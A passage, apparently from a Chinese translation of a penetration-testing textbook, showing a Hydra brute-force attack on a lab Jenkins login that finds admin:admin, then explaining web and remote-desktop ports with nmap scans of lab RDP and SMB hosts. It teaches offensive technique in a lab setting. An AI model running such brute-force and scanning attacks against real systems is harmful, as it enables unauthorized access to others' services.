  \ ‐s 8080 172.16.0.103 http‐post‐form \"/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Jenkins‐Crumb=6a3b8d2a8000e1aaea8566f6cec42658&json=%7B%22j_username%22%3A+%22test%22%2C+%22j_password%22%3A+%22test%22%2C+%22remember_me%22%3A+false%2C+%22from%22%3A+%22%2F%22%2C+%22Jenkins‐Crumb%22%3A+%226a3b8d2a8000e1aaea8566f6cec42658%22%7D&Submit=log+in:Invalid\
  \ login information\"\n[…]\n[DATA] attacking http-post-form://172.16.0.103:8080/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Jenkins-Crumb=6a3b8d2a8000e1aaea8566f6cec42658&json=%7B%22j_username%22%3A+%22test%22%2C+%22j_password%22%3A+%22test%22%2C+%22remember_me%22%3A+false%2C+%22from%22%3A+%22%2F%22%2C+%22Jenkins-Crumb%22%3A+%226a3b8d2a8000e1aaea8566f6cec42658%22%7D&Submit=log+in:Invalid\
  \ login information\n[8080][http‐post‐form] host: 172.16.0.103 login: admin password:\
  \ admin\n[STATUS] attack finished for 172.16.0.103 (valid pair found)\n1 of 1 target\
  \ successfully completed, 1 valid password\n```\n\n看起来我们找到了一个成功的候选组合：admin:admin。\n\
  \n## Web 协议 80/443\n\n如今 Web 应用几乎无了一切；这就是为什么我们有一个专门针对 Web 应用枚举和利用的章节。在上一节中，你已经学习了如何使用\
  \ Burp Suite 拦截 Web 请求，并使用 Hydra 对 Web 应用进行暴力破解。目前，你需要理解大多数 Web 服务器会使用两个端口号（默认情况下）提供\
  \ Web 应用服务：\n\n* `HTTP TCP 端口 80`：用于提供明文 Web 请求和响应。如果你嗅探了运行在 80 端口的网站网络，你将看到明文登录凭据。\n\
  * `HTTPS/TLS TCP 端口 443`：HTTP 协议的安全版本称为 HTTPS 或 TLS。通信是安全的，除非有拦截流量的代理，否则嗅探器将无法查看流量。大公司使用代理并向用户主机注入证书，以便他们能够监控员工的\
  \ HTTPS 流量。\n\n## 图形化远程协议\n\n如今可以轻松地远程连接 Windows 和 Linux 的图形用户界面。在本节中，你将学习如何识别远程协议服务，以及像专业人士一样黑入它。以下是用于此目的的最常见应用程序：\n\
  \n* `远程桌面协议 (RDP)`：TCP 端口 3389\n* `虚拟网络计算 (VNC)`：TCP 端口 5900\n\n### RDP (端口 3389)\n\
  \n远程桌面协议是远程连接 Windows 操作系统的常用应用程序。如果远程主机启用了该功能，用户就可以连接到 Windows 主机的图形用户界面。请注意，RDP\
  \ 服务器将监听 3389 端口以完成任务。\n\n让我们快速扫描一个运行 RDP 服务器的主机：\n\n```\nroot@kali:~# nmap ‐sV\
  \ ‐sC ‐O ‐T5 ‐p 3389 172.16.0.104\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-16\
  \ 10:04 EDT\nNmap scan report for 172.16.0.104\nHost is up (0.00056s latency).\n\
  \nPORT STATE SERVICE VERSION\n3389/tcp open ms‐wbt‐server Microsoft Terminal Services\n\
  | rdp-ntlm-info: \n|  Target_Name: KCORP\n|  NetBIOS_Domain_Name: KCORP\n|  NetBIOS_Computer_Name:\
  \ WINDOWS10LAB\n|  DNS_Domain_Name: KCorp.local\n|  DNS_Computer_Name: Windows10Lab.KCorp.local\n\
  |  DNS_Tree_Name: KCorp.local\n```\n\n*(注：后续重复的 RDP 章节已根据要求略去)*\n\n\n\n\n\n```\n\
  root@kali:~# nmap ‐sV ‐T5 ‐p 445 ‐sC 172.16.0.106\nStarting Nmap 7.80 ( https://nmap.org\
  \ ) at 2020-06-18 09:36 EDT\nNmap scan report for 172.16.0.106\nHost is up (0.00072s\
  \ latency).\n\nPORT STATE SERVICE VERSION\n445/tcp open microsoft‐ds Windows 10\
  \ Pro 10240 microsoft‐ds (workgroup: KCORP)\nMAC Address: 00:0C:29:87:09:90 (VMware)\n\
  Service Info: Host: WINDOWS10LAB02; OS: Windows; CPE: cpe:/o:microsoft:windows\n\
  \nHost script results:\n|_clock-skew: mean: 2h19m59s, deviation: 4h02m29s, median:\
  \ 0s\n|_nbstat: NetBIOS name: WINDOWS10LAB02, NetBIOS user: <unknown>, NetBIOS MAC:\
  \ 00:0c:29:87:09:90 (VMware)\n| smb-os-discovery: \n|  OS: Windows 10 Pro 10240\
  \ (Windows 10 Pro 6.3)\n|  OS CPE: cpe:/o:microsoft:windows_10::-\n|  Computer name:\
